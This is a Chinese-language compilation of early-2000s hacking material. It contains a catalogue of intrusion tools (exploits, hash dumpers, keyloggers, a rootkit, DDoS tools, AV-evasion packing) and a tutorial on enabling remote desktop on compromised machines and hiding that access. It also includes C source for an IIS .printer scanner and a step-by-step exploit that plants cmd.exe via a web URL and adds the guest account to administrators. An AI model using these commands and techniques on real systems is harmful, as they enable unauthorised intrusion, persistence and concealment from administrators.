
【119款经典黑客小工具使用】


我自己的加去



webadv 针对iis+sp3的溢出成功率很高(溢出后system权限!) * 

ipscan 大范围网段快速ipc$猜解 

svc 远程安装/删除win2k服务 

3389.vbs 远程安装win2k终端服务不需i386 

arpsniffer arp环境sniffer(需要winpcap2.1以上) * 

ascii 查询字符和数字ascii码(常用来对url编码用以躲避ids或脚本过滤) 

ca 远程克隆账号 

cca 检查是否有克隆账号 

cgi-backdoor 几个cgi木马(十多种利用最新漏洞的web脚本后门，涵盖jsp,php,asp,cgi等等) * 

crackvnc 远程/本地破解winvnc密码(本地破用-W参数) 

pass.dic 密码字典 

debploit win2k+sp2配置最佳权限提升工具 

fpipe 端口重定向工具 

fscan superscan命令行版本(可定义扫描时的源端口并支持udp端口扫描) * 

hgod04 ddos攻击器 

idahack ida溢出 

idq.dll 利用isapi漏洞提升权限(对sp0+sp1+sp2都非常有效，也是很棒的web后门) 

IIS idq溢出 

inst.zip 指定程序安装为win2k服务 * 

ip_mail.rar 发送主机动态IP的软件 * 

ipc.vbs 不依赖ipc$给远程主机开telnet 

ispc.exe idq.dll连接客户端 

Keyghost.zip 正版键盘记录器 

log.vbs 日志清除器(远程清除不依赖ipc$) 

md5.pl 论坛md5加密密码破解器 

msadc.pl winnt的msadc漏洞溢出器 * 

MsSqlHack mssql溢出程序1 

mysql-client mysql客户端 

Name.dic 最常用的中国人用户名(看看你常用的用户名在不在里面) 

PassSniffer 大小仅3kb的非交换机sniffer软件 * 

psexec 通过ipc管道直接登录主机 

pskill 杀进程高手:) 

pslist 列进程高手:) 

rar 命令行下的中文版winrar(功能相当全面) * 

reboot.vbs 远程重启主机的脚本 

sdemo.zip 巨好的屏幕拍摄的录像软件 

shed 远程查找win9x的共享资源 

sid 用sid列用户名 

SkServerGUI snake多重代理软件 

SkSockServer snake代理程序 

SMBCrack 超快的ipc破解软件（适合破一台机) 

socks 利用这工具安装木马，即使网关重新低格硬盘木马也在嘿嘿 * 

SocksCap 把socks5代理转化为万能代理 

SPC.zip 可以直接显示出远程win98共享资源密码的东东 * 

WMIhack 基于WMI服务进行账号密码的东东(不需要ipc) 

skmontor snake的注册表监视器（特酷的) 

sql1.exe mssql溢出程序2 

sql2.exe mssql溢出程序3 

SqlExec mssql客户端 

SuperScan GUI界面的优秀扫描器 

syn syn攻击第一高手 

upx120 特好的压缩软件，常用来压缩木马躲避杀毒软件 

wget 命令行下的http下载软件 

Win2kPass2 win2k的密码大盗 

Winnuke 攻击rpc服务的软件(win2ksp0/1/2/3+winnt+winxp系统不稳定) 

smbnuke 攻击netbios的软件(win2ksp0/1/2/3+winnt+winxp系统死机) 

WinPcap_2_3 nmap,arpsniffer等等都要用这个 

WinPcap_2_3_nogui.exe 无安装界面自动安装的WinPcap_2_3（命令行版) * 

scanbaby2.0 能对80%的mail服务利用漏洞列账号密码破解(超酷哦，去看rfc里有mail弱点说明) * 

SuperDic_V31 非常全面的黑客字典生成器 

Getadmin win2k+sp3配置的权限提升程序(不错!!!) * 

whoami 了理自己的权限 

FsSniffer 巨好的非交换机sniffer工具 

twwwscan 命令行下巨好的cgi扫描器 

TFTPD32 给远方开tftp服务的主机传文件(当然要有个shell) 

RangeScan 自定义cgi漏洞的GUI扫描器 

pwdump2 本地抓winnt/2k密码散列值(不可缺) 

pwdump3 远程抓winnt/2k密码散列值(不可缺) 

procexpnt 查看系统进程与端口关联(GUI界面) * 

nc 已经不是简单的telnet客户端了 

CMD.txt 有什么cmd命令不懂就查查它 * 

fport 命令行下查看系统进程与端口关联(没有GUI界面的procexpnt强) 

BrutusA2 全功能的密码破解软件,支持telnet,ftp,http等服务的口令破解 

cmd.reg 文件名自动补全的reg文件(命令行:按TAB键自动把sys补全为system,再按一次就变为system32) 

regshell 命令行下的注册表编辑器 

nscopy 备份员工具(当你是Backup Operators组的用户时有时你的权限会比admin还大) 

session.rar 有了win/nt2000目标主机的密码散列值,就可以直接发送散列值给主机而登录主机 * 

klogger.exe 一个几kb的击键记录工具,运行后会在当前目录生成KLOGGER.TXT文件 * 

smb2 发动smb的中间人MITM攻击的工具，在session中插入自己的执行命令 * 

xptsc.rar winxp的远程终端客户端(支持win2000/xp) 

SQLhack.zip 相当快的mssql密码暴力破解器 

mssql 相当快的mssql密码暴力破解器 

ntcrack.zip 利用获取到的MD4 passwd hash破解帐号密码 

SQLSniffer.rar MSsql的密码明文嗅探器 

TelnetHack.rar 在拥有管理员权限的条件下，远程打开WIN2000机器的Telnet服务 

RFPortXP.exe XP下关联端口与进程的程序 

SQLTools.rar mssql工具包 

ServiceApp.exe 远程安装/删除服务 

hgod 具有SYN/DrDos/UDP/ICMP/IGMP拒绝服务测试功能的选项 

hscan 小型综合扫描器(支持cisco,mysql,mssql,cgi,rpc,ipc(sid),ftp,ssh,smtp等等相当全面) 

HDoor.rar ping后门(icmp后门) 

SIDUserEnum.exe 利用sid得到用户列表(小榕的那个sid有时不能完全列举出来) * 

RPC_LE.exe 利用rpc溢出使win2k重启(对sp3+sp4hotfix有效) * 

r3389.exe 查询Terminal Server更改后的端口（1秒内） * 

smbsniffer.exe 获取访问本地主机网页的主机散列值(支持截获内网主机散列) * 

NetEnum.exe 通过3389端口+空连接获取对方主机大量信息 * 

aspcode.exe 经测试最有效的asp溢出程序第二版(对sp2有效) 

sslproxy 针对使用ssl加密协议的代理（扫描器通过它就可以扫描ssl主机了!!!!) * 

lsa2 在lsa注册表键里获取winnt/2k的明文密码包括sqlserver的(打了补丁就没用了) * 

psu.exe 用指定进程的权限打开指定的程序 

ldap.msi ldap 轻量级目录服务客户端,通过389端口获取主机大量信息如账号列表 * 

rootkit 从系统底层完美隐藏指定进程，服务，注册表I并可以端口绑定的内核级win2k后门!!! * 

后记: 

在我做安全检测和渗透入侵的时候，这些工具都帮了我不小的忙(当然还有一些大工具如ISS、SSS、X-SCAN)。当然，有时候扫描不出漏洞时就要靠自己去分析安全隐患了，这样的例子不少，比如我对一些网站成功地渗透入侵的事例其中就是利用了大量的脚本和sql知识（只能利用80端口并且xp_cmdshell等几十个扩展存储都不可恢复）以及对安全模型的理解，而工具派不上任何用场。所以我有一条安全检测准则：%10的工具灵活应用+%30经验技术+%60的分析=一次较有深度的安全检测.

【3389】
 3389 在漏洞不段出现的今天，入侵一台服务器已经不是什么新鲜事，但凡是入侵成功之后，都想尽办法来打开终端服务，什么是终端呢？又怎么在远程打开呢？看完本文，你就会成为一个开“终端的高手”。

文：终端服务全攻略 
作者：dahubaobao
主页：http://www.ringz.org 
邮件：dahushibaobao@vip.sina.com 
QQ：382690
发表于黑客防线2004年1期
工具及图片都在压缩包中，解压密码：www.ringz.org 
http://dahubaobao.go.nease.net/Terminating.rar 
欢迎进入环形区，一群技术狂热者的社区，www.ringz.org欢迎你的加入！
=====================================================================
终端服务全攻略

在漏洞不段出现的今天，入侵一台服务器已经不是什么新鲜事，但凡是入侵成功之后，都想尽办法来打开终端服务，什么是终端呢？又怎么在远程打开呢？看完本文，你就会成为一个开“终端的高手”。

什么是终端服务
3389又称Terminal Service，服务终端。在WindowsNT中最先开始使用的一种终端，在Win2K的Professional版本中不可以安装，在Server或以上版本才可以安装这个服务，其服务端口为3389。由于使用简单，方便等特点，一直受系统管理员的青昧。也正式因为他的简便，不产生交互式登陆，可以在后台操作，因此也受到了黑客朋友的喜爱，事实可以说明，现在大多数朋友在入侵之后，都想打开windows终端服务，甚至不惜重启对方的计算机，也要把终端服务安装上，由此可见他的普遍性。另，在在XP系统中又叫做“远程桌面”。

打开终端服务的各种方法
下面进入正题，开始今天的“终端”之旅。（各种工具我会提供）
一， 使用ROTS.VBS脚本
插拨广告：
1， 什么是VBS
VBScript的全称是:Microsoft Visual Basic Script Editon.(微软公司可视化BASIC脚本版). 正如其字面所透露的信息, VBS(VBScript的进一步简写)是基于Visual Basic的脚本语言. 我进一步解释一下, Microsoft Visual Basic是微软公司出品的一套可视化编程工具, 语法基于Basic. 脚本语言, 就是不编译成二进制文件, 直接由宿主(host)解释源代码并执行, 简单点说就是你写的程序不需要编译成.exe, 而是直接给用户发送.vbs的源程序, 用户就能执行了。

知道什么是VBS了，下面开始进行测试。首先你要获得这台主机的Administrator权限或Local System权限，具体怎么获得在这不必讨论。先来看看ROTS.VBS帮助.。(见图1)
ROTS v1.01
Remote Open Terminal services Script, by zzzEVAzzz
Welcome to visite www.isgrey.com 
Usage:
cscript c:\scriptpath\ROTS.vbs targetIP username password [port] [/r]
port: default number is 3389.
/r: auto reboot target.

一般的命令格式：ROTS.vbs <目标IP> <用户名> <密码> [服务端口] [自动重起选项]。

下面打开本地CMD，输入：ROTS.vbs XXX.XXX.XX.XXX dahubaobao dahu 3389 /fr

注意：
1，/fr为强制重启，/r为普通重启，不要搞混了。
2， 脚本会判断目标系统类型,如果不是server及以上版本,就会提示你是否要取消。

优点：成功率高。
缺点：必须重新启动。
二，使用批处理（bat）
open3389.bat，先来看看帮助：（见图2）
*******************Open3389*********************
使用方法：
open3389.bat ip user password
open3389.bat 目标ip 用户名 密码
还是打开CMD，输入：open3389.bat XXX.XXX.XX.XXX dahubaobao dahu

好了 就这样来打开3389，bat文件真的很好用，建议大家去学习。

优点：不必重新启动。
缺点：成功率不高。

三， 使用HBULOT
这个工具要上传到对方的机器，然后执行，比较麻烦。
C:\>net use \\XXX.XXX.XX.XXX\IPC$ "dahu" /user:"dahubaobao" //建立IPC连接
C:\>copy HBULOT.exe \\ XXX.XXX.XX.XXX \WINNT\admin$ //上传到对方的systeme32目录下。
C:\>net use \\XXX.XXX.XX.XXX\IPC$ /del //断开IPC

然后telent过去，到对方的WINNT\systeme32目录下，直接运行HBULOT.exe即可（见图
3）。 
---------------------------------------------------------------------------------------------------------------

下面介绍的不需要工具，具体请看我的方法
首先telent过去，然后输入query user，使用这个命令的前提是安装终端，如果出现如图4
的情况，就表明安装了终端。如果没有，那就证明没有安装，请看我是怎么做的：

C:\> dir c:\sysoc.inf /s //查找sysoc.inf文件的位置 
c:\WINNT\inf 的目录

2003-06-19 12:05 3,458 sysoc.inf
1 个文件 3,458 字节

C:\>dir c:\sysocmgr.* /s //查找组件安装程序
c:\WINNT\system32 的目录

1900-10-29 04:00 42,768 sysocmgr.exe
1 个文件 42,768 字节

C:\>echo [Components] > c:\ts 
C:\>echo TSEnable = on >> c:\ts
//建立无人职守安装的参数
C:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q
开启3389，并且重新启动，如果
C:\>sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q /r
开启3389，不重新启动。

如果重新启动，那等几分钟就可以用客户端连接了，如果没重新启动，那就要等对方重新启动之后，才能连接（看你的耐心喽）。
----------------------------------------------------------------------------------


在介绍一种很方便的做法，就是做一个bat文件，在本地运行即可，下面是bat的内容
echo [Components] > c:\ts

echo TSEnable = on >> c:\ts

C:\sqlsysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q

net use \\ip\ipc$ dahu /user:dahubaobao

copy 路径:\xxx.bat \\ip\winnt\admin$

at time 00:00:00 xxx.bat

主机执行之后，会自动重启，之后就可以利用3389登陆了。

这个bat文件很容易，前两条语句是“建立无人职守安装的参数”，第三条是真正的“开启终端的命令”，第四条是“IPC连接”，第五是“把bat文件copy到对方的winnt\system32目录下”，最后是用“time获取时间，然后用at命令启动。”

（个人推荐这种方法，比较简单，有点IPC知识的就可以实现。）


修改终端服务端口
这一步很重要，我们辛苦的开启了终端服务，不能因为“3389”的暴露而前功尽弃，所以端口是必须修改的，先说一下原理，终端服务安装完成后，会在注册表中增加两个键，其键值分别为16进制的3389，即“0x00000D3D”。现在打开“运行”，输入“regedit”启动注册表编辑器，然后打开HKEY-LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer\Wds\Repwd\Tds\Tcp和HKEY-LOCAL_MACHINE\System\CurrentControlSet\Control\TerminalServer\WinStartions\RDP-TCP子键，修改“PortNumber”，假如我们修改成8080端口，其键值为“1F90”，保存退出，注意，重启之后才能生效，修改完成之后，会到本地，打开客户端，输入：XXX.XXX.XXX.XX:8080，就可以连接了。（见图5，6）

有的朋友对注册表不熟悉，更有甚者恐惧注册表，认为是很难驾御的地方，那好办，下面介绍一个小工具，可以在命令行下修改端口，看我是怎么做的：还是先来看帮助
=======================================================
Change Local or Remote TermService Port Program
Code By wawa@21cn.Com Http://www.Haowawa.Com 
=======================================================
Local Usage: c3389 7358
Remote Usage: c3389 \\192.168.0.1 adminname password 7358

Local Host TermService Port is : 3389

本地修改：c3389 端口
远程修改：c3389 \\XXX.XXX.XXX.XX Admin用户 密码 端口

先来看本地修改：
打开CMD。输入c3389 post，具体见图7。

在来看远程修改：
输入c3389 \\XXX.XXX.XXX.XX adminname password post。

到这里，端口就修改关闭了。

隐藏上次登陆过的用户名
在终端安装完成后，并且你已经登陆过，那么再次登陆就会显示上次登陆过的用户名，如果我们添加的帐户（或克隆）被管理员看到了，那不起疑心才怪呢？所以我们要隐藏登陆过的用户，要实现隐藏，还是要修改注册表，具体看我怎么做：在“运行”中输入“regedit”启动注册表编辑器，依次展开：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon子键下的DontDisplayLastUserName，默认键值为“0”，我们修改为“1”，保存，退出，重新启动之后生效。见图8


限制/指定连接终端的地址
现在我们已经给肉鸡看了终端，并且修改了端口，还做了一些简单的维护，但这还是不够的，假如某人知道了我们修改过的端口就是终端服务，那就挂了，所以还要在肉鸡上通过IPSEC这个系统自带的而且功能非常强大的工具来做一下限制，具体请看我的演示：

1，静态IP
假如我的IP是111.222.255.255，我们通过设置IPSEC，来让肉鸡上的终端只通过我的连接，而拒绝除了我以外的所有连接，好，就这么办，先登陆终端，然后打开“管理工具”―“本地安全设置”，设置如下：

首先右键点击“IP安全策略 在本地机器”选择“创建IP策略”，然后打开了一个向导，即“IP安全策略向导”―“下一步”―“名称”―“下一步”取消“激活默认响应规则”―“下一步”―“完成”，这是会重新打开一个“新IP安全策略 属性”（见图9），取消“使用“添加向导””―“添加”―出现“新规则属性”―“添加”―出现“IP筛选器列表”―取消“使用“添加向导””―“添加”―出现“筛选器 属性”，选择“寻址”标签，源地址设为‘任何IP地址’，目的地址设为‘我的IP地址’；在选择“协议”标签，选择协议类型设为‘TCP’，设置IP协议端口‘从任意端口’―‘到此端口8080’―“确定”（见图10，11）--“关闭”―回到“新规则 属性”―选择“新IP筛选器列表”―在选“筛选器操作”标签―取消“使用“添加向导””―“添加”―在“安全措施”标签下选择“阻止”―“确定”―“关闭”（见图12），回到“新规则 属性”―选中“新筛选器操作”―“关闭”―“关闭”―回到“本地安全设置”―选中“新IP安全策略”―右键点击“指派”（见图13），好了，总算设置完了，这样所有的机器就无法连接8080（终端）端口了。

注意：以上都是使用默认的名称，所以大家在设置的时候注意一下。

由于上边的设置，把我自己也挡在了外面，这可不是我所想要的，所以，我们还要建立一条规则，允许我的IP 111.222.255.255访问对方的8080端口，方法如下：

右键点击“新IP安全策略”―“属性”―不选“使用“添加向导””―出现“新规则 属性”―“添加”―出现“IP筛选器列表”―不选“使用“添加向导””―“添加”―出现“筛选器 属性”―选择“寻址”标签，设置成如图14的样子，在选择“协议”标签，设置成如图12的样子，然后“确定”―“关闭”―回到“新规则 属性”―选中“新IP筛选器列表（1）”―在选“筛选器操作”标签―在选“允许”―“关闭”―“关闭”―回到“本地安全设置”。
（见图15）

2，动态IP

在中国，拥有静态IP的人毕竟是少数，大多数朋友还都是拨号，虽然现在ADSL很普遍，但ADSL还是虚拟拨号，即动态IP，所以用上边的方法设置IPSEC肯定是不行的，所以，现在我们要修改上边的一条规则，使IPSEC可以通过 特定子网的连接，方法很简单，其他的都不用改，按照图16的方法设置就可以了。



【3389肉鸡快捷键】
ＣＴＲＬ＋ＡＬＴ＋ＥＮＤ 把“任务管理器”抓出来　
ＣＴＲＬ＋ＡＬＴ＋ＢＲＥＡＫ这个就是切换全屏显示。
CTRL+ALT+END 打开“Windows 安全”对话框。 

ALT+PAGE UP 从左向右在程序之间切换。 

ALT+PAGE DOWN 从右向左在程序之间切换。 

ALT+INSERT 按启动顺序来回切换程序。 

ALT+HOME 显示“开始”菜单。 

CTRL+ALT+BREAK 在窗口（如果适用）和全屏显示之间切换客户端。 

ALT+DELETE 显示窗口的弹出式菜单。 

CTRL+ALT+减号 (-) 将客户端活动窗口的快照放在“终端”服务器的剪贴板上（与在本地计算机上按下 ALT+PrintScrn 键时的功能相同）。 

CTRL+ALT+加号 (+) 将整个客户端窗口区域的快照放在“终端”服务器的剪贴板上（与在本地计算机上按下 PrintScrn 键时的功能相同）。 

注意: 

在NEC98 计算机中，这些快捷键在以下两种情况下会有些不同： 

CTRL+ALT+BREAK由 F12 键代替。 
CTRL+ALT+END 由 F15 键代替。 




【80端口、512端口、3389端口……入侵实例】
80端口、512端口、3389端口……入侵实例 

（2004-04-09 17:16）  
有很多网站为了安全起见，在WEB Server前面架了防火墙，或者做了TCP/IP过滤，对外只开放TCP 80端口。从入侵者角度来看，要入侵那么从80上跑的CGI入手是比较可行的，当然也可以用别的办法，例如旁敲侧击，呵呵。从网管角度来看，一是要保证CGI的安全性，另外网络的整体安全性也是很重要的。针对基于80端口入侵、防范而出的CGI扫描器数不胜数，但基本上原理都一样。 
　　CGI扫描器原理说起来其实非常简单，可以用四句话来概括：<1>连接目标WEB SERVER；<2>发送一个特殊的请求；<3>接收目标服务器返回数据；<4>根据返回数据判断目标服务器是否有此CGI漏洞。 
　　当管理的服务器达到一定数量的时候，手工检测自己的服务器是否存在各种各样的CGI漏洞，那就太消耗时间和精力了，所以一个网管手上有个比较好用的CGI漏洞扫描器还是必要的。OK！今天我们就自己来动手用C写一个简单的CGI扫描器，帮助自己在日常工作中检测服务器：）） 
　　源代码如下，很多地方我都加了注释，别嫌我烦哦：））编译好的程序可以从http://eyas.3322.net/program/cgicheck.exe下载。 
　　/************************************************************************* Module：CGICheck.cpp Author：ey4s Date：2001/5/16说明：这是一个Console下多线程，带有进度显示的CGI扫描器的模板，更改一下szSign和SendBuff就可以扫描其他CGI漏洞，设置了连接、发送、接收超时，速度还可以哦。希望可以帮助到admins检测自己的服务器：）） 
　　*************************************************************************/ #include 
　　　　　　　　　　　　　　　　　 
　　#define iPort 80//目标Web Server端口#define szSign “500 13\r\nServer： Microsoft-IIS/5.0”//根据此标志来检查目标是否有漏洞 
　　　　　　　　　　　　　　　　　 
　　#pragma comment（lib，“ws2_32.lib”） 
　　/////////////////////////////////////////////////////////////////////////// // //定义&初始化全局变量// char *SendBuff=“GET /NULL.printer\n”，//发送的请求buff CurrentTarget[52]=，//存放最后一个线程将扫描的目标turn[4][2]=；//显示进度时的字符int SendBuffLen=strlen（SendBuff），//发送的buff长度iConnTimeout，//TCP Connect TimeOut ii=0，//扫描进度iTotal；//服务器总数HANDLE hSemaphore=NULL，//信标内核对象句柄，用来控制线程数量hStdout；//console标准输出句柄，做进度显示的时候用的struct timeval timeout；//连接、发送和接收的超时值DWORD SleepTime；//每个一个线程后等待的时间/* SleepTime值根据用户输入的线程数量[ThreadNum]和TCP ConnectTimeOut[CONNTIMEO]来计算。确保在CONNTIMEO时间左右开ThreadNum个线程。这样在CONNTIMEO时间后，所开的线程开始陆续超时退出，可以继续稳定的开线程，可以有效的保证同时有ThreadNum个线程在运行。 
　　*/ /////////////////////////////////////////////////////////////////////////// void ShowError（char *）；//显示出错信息函数，可以写完善一些，偶偷懒了：） 
　　BOOL ResetCursor（void）；//重置光标位置，线程输出的时候调用的DWORD WINAPI ShowProInfo（LPVOID）；//显示进度信息DWORD WINAPI scan（LPVOID）；//扫描函数void usage（char *）；//帮助函数/////////////////////////////////////////////////////////////////////////// int main（int argc，char **argv） 
　　{ HANDLE hThread=NULL；//线程句柄DWORD dwThreadID；//线程ID struct sockaddr_in sa；int i，MaxThread；//最大线程数量WSADATA wsd；long PreviousCount；clock_t start，end；//程序运行的起始和结束时间double duration； 
　　　　　　　　　　　　　　　　　 
　　//检查用户输入参数if（argc！=5） 
　　{ usage（argv[0]）；return 1；} //get target range int StartNet=inet_addr（argv[1]）；int StopNet=inet_addr（argv[2]）；int StartHost=ntohl（StartNet）；int StopHost=ntohl（StopNet）；//取得线程数量MaxThread=atoi（argv[3]）；//取得conn超时时间iConnTimeout=atoi（argv[4]）；//检查参数合法性if（（iConnTimeout>6） || （iConnTimeout<2） || （MaxThread<1） || （MaxThread>500） ||（StopHost { usage（argv[0]）；return 1；} //计算时间SleepTime=1000*iConnTimeout/MaxThread；//设置连接超时值timeout.tv_sec = iConnTimeout；timeout.tv_usec =0；__try { //开始计时start=clock（）；//加载winsock库if （WSAStartup（MAKEWORD（1，1）， &wsd） ！= 0） 
　　{ ShowError（“WSAStartup”）；__leave；} //创建信标内核对象句柄hSemaphore=CreateSemaphore（NULL，MaxThread，MaxThread，NULL）；if（hSemaphore==NULL） 
　　{ ShowError（“CreateSemaphore”）；__leave；} //取得console标准输出句柄hStdout=GetStdHandle（STD_OUTPUT_HANDLE）；if（hStdout==INVALID_HANDLE_value） 
　　{ ShowError（“GetStdHandle”）；__leave；} //设置目标总数iTotal=StopHost-StartHost；//创建进度显示线程hThread=CreateThread（NULL，0，ShowProInfo，NULL，0，&dwThreadID）；if（hThread==NULL） 
　　{ ShowError（“1 CreateThread”）；__leave；} //关闭句柄CloseHandle（hThread）；//循环创建扫描线程for（i=StartHost；i<=StopHost；i++） 
　　{ //等待信标内核对象通知WaitForSingleObject（hSemaphore，INFINITE）；//create thread to scan hThread=CreateThread（NULL，0，scan，（LPVOID）i，0，&dwThreadID）；if（hThread==NULL） 
　　{ ShowError（“2 CreateThread”）；break；} //进度自加1 ii++；//重设最后一个线程扫描的目标sa.sin_addr.s_addr=htonl（i）；strncpy（CurrentTarget，inet_ntoa（sa.sin_addr），sizeof（CurrentTarget））；//休息一会儿） 
　　Sleep（SleepTime）；//关闭线程句柄CloseHandle（hThread）；} //等待所有线程结束while（1） 
　　{ WaitForSingleObject（hSemaphore，INFINITE）；if（！ReleaseSemaphore（hSemaphore，1，&PreviousCount）） 
　　{ ShowError（“main（） ReleaseSemaphore”）；Sleep（5000）；break；} if（PreviousCount==（MaxThread-1）） 
　　{ printf（“\nAll done.”）；break；} Sleep（500）；} }//end of try //搞定，清场，收工__finally { //计时结束end=clock（）；//转换时间格式duration = （double）（end - start） / CLOCKS_PER_SEC；//显示所用时间printf（“\n\nComplete.Scan %d targets use %2.1f seconds.Speed %0.3g/s\n”，iTotal，duration，iTotal/duration）；//关闭句柄CloseHandle（hStdout）；CloseHandle（hSemaphore）；WSACleanup（）；} return 0；} /////////////////////////////////////////////////////////////////////////// // //回显错误信息函数// void ShowError（char *msg） 
　　{ MessageBox（NULL，msg，“ERROR”，0）；//printf（“\n%s failed：%d”，GetLastError（））；} ////////////////////////////////////////////////////////////////////////// // //重置光标位置函数，以便扫描线程输出结果// BOOL ResetCursor（） 
　　{ CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo；//取得当前光标位置if（！GetConsoleScreenBufferInfo（hStdout，&ConsoleScreenBufferInfo）） 
　　{ ShowError（“GetConsoleScreenBufferInfo”）；return FALSE；} //设置光标X坐标为0 ConsoleScreenBufferInfo.dwCursorPosition.X=0；//设置当前光标位置SetConsoleCursorPosition（hStdout，ConsoleScreenBufferInfo.dwCursorPosition）；return TRUE；} /////////////////////////////////////////////////////////////////////////// // //显示进度信息函数// DWORD WINAPI ShowProInfo（LPVOID lp） 
　　{ int j，k；CONSOLE_SCREEN_BUFFER_INFO ConsoleScreenBufferInfo；float m；for（j=0；ii { //休息一会儿）） 
　　Sleep（SleepTime）；//取得当前光标位置if（！GetConsoleScreenBufferInfo（hStdout，&ConsoleScreenBufferInfo）） 
　　{ ShowError（“GetConsoleScreenBufferInfo”）；return 1；} //设置百分比进度显示的X坐标ConsoleScreenBufferInfo.dwCursorPosition.X=0；//设置当前光标位置SetConsoleCursorPosition（hStdout，ConsoleScreenBufferInfo.dwCursorPosition）；//已经完成的百分比m=（ii+1）*100.00/iTotal；//显示进度if（ii==iTotal） 
　　{ printf（“******** 100%% Wait %d seconds to exit ******** 
\n",iConnTimeout); 

　　break；} else { k=j%4；printf（“%-15s %s [%d/%d] %s %%%0.3g”，CurrentTarget，turn[k]，ii，iTotal，turn[k]，m）；} }//end of for return 0；} /////////////////////////////////////////////////////////////////////////// // //扫描函数// DWORD WINAPI scan（LPVOID lp） 
　　{ int i=（int）lp，iErr；struct sockaddr_in server；SOCKET s=INVALID_SOCKET；char RecvBuff[1024]=，*ptr；int RecvBuffLen=sizeof（RecvBuff）；u_long ul=1；//初始化为为非0值fd_set r，w； 
　　　　　　　　　　　　　　　　　 
　　//create socket s=socket（AF_INET， SOCK_STREAM， IPPROTO_TCP）；if（s==INVALID_SOCKET） 
　　{ printf（“\nCreate socket failed：%d”，GetLastError（））；ExitProcess（1）；} //fill the addr struct server.sin_family=AF_INET；server.sin_port=htons（iPort）；server.sin_addr.S_un.S_addr=htonl（i）；__try { //设置socket为非锁定模式，ul为0值的话，那么soocket将被设置为锁定模式iErr=ioctlsocket（s，FIONBIO，（unsigned long*）&ul）；if（iErr==SOCKET_ERROR ） 
　　{ ResetCursor（）；ShowError（“ioctlsocket”）；ExitProcess（1）；} //printf（“\n%X ioctl ok.strat conn”，i）；//connect to target connect（s，（struct sockaddr *）&server，sizeof（server））；//printf（“\n%X conn return，start select w”，i）；//设置select参数FD_ZERO（&w）；FD_SET（s， &w）；//等待connect成功&socket可写iErr=select（0， 0， &w， 0， &timeout）；//printf（“\n%X select w return %d”，i，iErr）；//等待返回后，socket仍不可写则退出if（（iErr==SOCKET_ERROR） || （iErr==0）） 
　　{ //printf（“\n%X select return w err，exit”，i）；__leave；} //socket可写则继续else { //send buff to target //printf（“\n%X send”，i）；iErr=send（s，SendBuff，SendBuffLen，0）；//printf（“\n%X send return”，i）；if（iErr==SOCKET_ERROR） 
　　__leave；} //等待socket可读FD_ZERO（&r）；FD_SET（s， &r）；//printf（“\n%X start select r”，i）；iErr=select（0， &r， 0， 0， &timeout）；//printf（“\n%X select r return %d”，i，iErr）；if（（iErr==SOCKET_ERROR） || （iErr==0）） 
　　{ //printf（“\n%X select r err，exit”，i）；__leave；} else { //recv buff from target //printf（“\n%X start recv”，i）；iErr=recv（s，RecvBuff，RecvBuffLen，0）；//printf（“\n%X recv ret”，i）；if（iErr==SOCKET_ERROR） 
　　__leave；} //verify buff ptr=strstr（RecvBuff，szSign）；if（ptr！=NULL） 
　　{ //线程输出前要先调用ResetCursor函数ResetCursor（）；//输出信息后务必加一个以上换行符号，输出前请别加换行符号，以免显示混乱printf（“[%-15s] has .printer mapped. 
\n",inet_ntoa(server.sin_addr)); 

　　} __finally { if（！ReleaseSemaphore（hSemaphore，1，NULL）） 
　　ShowError（“thread ReleaseSemaphore failed”）；closesocket（s）；} return 0；} /////////////////////////////////////////////////////////////////////////// void usage（char *proname） 
　　{ printf（“\n%s v0.1 only can find IIS5 .Printer mapped”“\nPower by ey4s 2001.5.20”“\nhttp://www.patching.net”“\n\nUsage：%s ”“\n\nNotice”“\n StartIP StopIP ==>Don't forgot StopIP must large than StartIP ”“\n ThreadNum ==>Thread number，please input between 1-500”“\n CONNTIMEO ==>TCP connect timeout，please input between 2-6”“\n\nExample”“\n %s 192.168.0.0 192.168.255.255 200 2”，proname，proname，proname）；}程序在VC++6.0上编译通过，在windows2000上运行良好：） 
　　　　　　　　　　　　　　　　　 
　　　　　　　　　　　　　　　　　 
　　　　　　　　　　　　　　　　　 
　　389端口的入侵3389端口的入侵3389端口的入侵 
　　　　　　　　　　　　　　　　　 
　　由于微软对中国产品不付责任的态度，使得安装了终端服务和全拼的w2k服务器存在着远程登陆并能获取超级用户权限的严重漏洞。 
　　其过程如下： 
　　　　　　　　　　　　　　　　　 
　　1.扫描3389 port终端服务默认；2.用终端客户端程序进行连接；3.按ctrl+shift调出全拼输入法（其他似乎不行），点鼠标右键（如果其帮助菜单发灰，就赶快赶下家吧，人家打补丁了），点帮助，点输入法入门；4.在“选项”菜单上点右键――>跳转到URL“，输入：c：\winnt\system32\cmd.exe.（如果不能确定NT系统目录，则输入：c：\或d：\……进行查找确定）；5.选择”保存到磁盘“选择目录：c：\inetpub\scripts\，因实际上是对方服务器上文件自身的复制操作，所以这个过程很快就会完成；6.打开IE，输入：http://ip/scripts/cmd.exe？/c dir怎么样？有cmd.exe文件了吧？这我们就完成了第一步；7.http://ip/scripts/cmd.exe？/c echo net user guest /active：yes>go.bat 8.http://ip/scripts/cmd.exe？/c echo net user guest elise》go.bat 9.http://ip/scripts/cmd.exe？/c echo net localgroup administrators /add guest》go.bat 10.http://ip/scripts/cmd.exe？/c type go.bat看看我们的批文件内容是否如下： 
　　　　　　　　　　　　　　　　　 
　　net user guest /active：yes net user guest elise net localgroup administrators /add guest 11.在“选项”菜单上点右键――>跳转到URL“，输入：c：\inetpub\scripts\go.bat ――>在磁盘当前位置执行；12.呵呵，大功告成啦，这样我们就激活了服务器的geust帐户，密码为：elise，超级用户呢！（我喜欢guest而不是建立新帐户，这样似乎不易被发现些），这样你就可用IPC$连接，想怎样做就怎样做了，当然，你也可用guest直接登陆到他的服务器，到他机器上去跳舞吧：-） 
　　　　　　　　　　　　　　　　　 
　　注意事项：1.当你用终端客户端程序登陆到他的服务器时，你的所有操作不会在他的机器上反应出来，但如果他正打开了终端服务管理器，你就惨了了：（这时他能看到你所打开的进程id、程序映象，你的ip及机器名，并能发消息给你！ 
　　2.当你连接时，会加重对方服务器的负荷，非常容易造成对方死机和断线，所以你的操作快点为妙。 
　　3.尽快做好后门，暂时不要上传任何程序，一是防止断线，二是防止对方打上补丁！ 
